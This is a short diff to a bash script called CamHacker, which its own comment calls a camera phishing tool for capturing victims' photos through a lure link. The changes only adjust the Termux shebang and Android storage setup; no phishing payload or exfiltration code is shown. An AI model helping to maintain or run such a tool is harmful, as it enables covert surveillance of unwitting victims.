@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 # CamHacker
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
@@ -36,12 +36,15 @@ else
 termux=false
 fi
 if $termux; then
-termux-setup-storage
 if ! [ -d /sdcard/Pictures ]; then
-
 cd /sdcard && mkdir Pictures
 fi
 export FOL="/sdcard/Pictures"
+cd "$FOL"
+if ! [[ -e ".temp" ]]; then 
+touch .temp  || termux-setup-storage
+fi
+cd "$cwd"
 else
 export FOL="$cwd"
 fi
